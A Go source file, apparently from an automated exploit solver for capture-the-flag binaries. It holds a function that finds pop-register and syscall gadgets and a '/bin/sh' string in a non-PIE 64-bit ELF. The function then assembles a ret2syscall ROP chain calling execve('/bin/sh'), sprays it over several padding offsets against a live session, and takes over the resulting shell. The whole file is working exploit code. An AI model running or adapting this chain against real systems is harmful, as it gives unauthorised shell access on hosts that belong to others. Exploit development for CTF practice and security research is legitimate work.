package solve

import (
	"bytes"
	"context"
	"debug/elf"
	"fmt"
)

// ropExecveStrategy builds an execve("/bin/sh", 0, 0) ROP chain from syscall
// gadgets found in the binary. It suits a non-PIE target that contains the
// needed `pop rax/rdi/rsi/rdx; ret` gadgets, a `syscall` instruction, and a
// "/bin/sh" string (true of statically linked binaries and classic ret2syscall
// challenges). No libc resolution is needed: the chain invokes the kernel
// directly. It runs over the session and drives the resulting shell.
func (s *solver) ropExecveStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" {
		return false, nil
	}
	f, err := elf.Open(s.path)
	if err != nil {
		return false, err
	}
	popRax, okA := findGadget(f, []byte{0x58, 0xc3})
	popRdi, okD := findGadget(f, []byte{0x5f, 0xc3})
	popRsi, okS := findGadget(f, []byte{0x5e, 0xc3})
	popRdx, okX := findGadget(f, []byte{0x5a, 0xc3})
	syscallG, okSys := findGadget(f, []byte{0x0f, 0x05})
	binsh, okB := findBinSh(f)
	f.Close()
	if !(okA && okD && okS && okX && okSys && okB) {
		missing := []string{}
		for name, ok := range map[string]bool{"pop rax": okA, "pop rdi": okD, "pop rsi": okS, "pop rdx": okX, "syscall": okSys, "\"/bin/sh\"": okB} {
			if !ok {
				missing = append(missing, name)
			}
		}
		if len(missing) < 6 { // only note when the target was a near miss
			s.report.Limitations = append(s.report.Limitations, fmt.Sprintf("ret2syscall skipped; missing %v", missing))
		}
		return false, nil
	}
	for _, off := range leakOffsets() {
		if err := ctx.Err(); err != nil {
			return false, err
		}
		done, err := s.liveAttempt(ctx, "ret2syscall", func(_ []uint64) ([]byte, string, bool) {
			var c []byte
			c = append(c, bytes.Repeat([]byte("A"), off)...)
			c = append(c, qword(popRax)...)
			c = append(c, qword(0x3b)...) // execve
			c = append(c, qword(popRdi)...)
			c = append(c, qword(binsh)...)
			c = append(c, qword(popRsi)...)
			c = append(c, qword(0)...)
			c = append(c, qword(popRdx)...)
			c = append(c, qword(0)...)
			c = append(c, qword(syscallG)...)
			if bytes.IndexByte(c, '\n') >= 0 {
				return nil, "", false
			}
			return c, fmt.Sprintf("ret2syscall padding=%d binsh=%#x", off, binsh), true
		})
		if err != nil || done {
			return done, err
		}
	}
	return false, nil
}

// findBinSh returns the virtual address of a "/bin/sh" string in a data section.
func findBinSh(f *elf.File) (uint64, bool) {
	for _, sec := range f.Sections {
		if sec.Type != elf.SHT_PROGBITS || sec.Flags&elf.SHF_ALLOC == 0 {
			continue
		}
		data, err := sec.Data()
		if err != nil {
			continue
		}
		if i := bytes.Index(data, []byte("/bin/sh\x00")); i >= 0 {
			return sec.Addr + uint64(i), true
		}
	}
	return 0, false
}
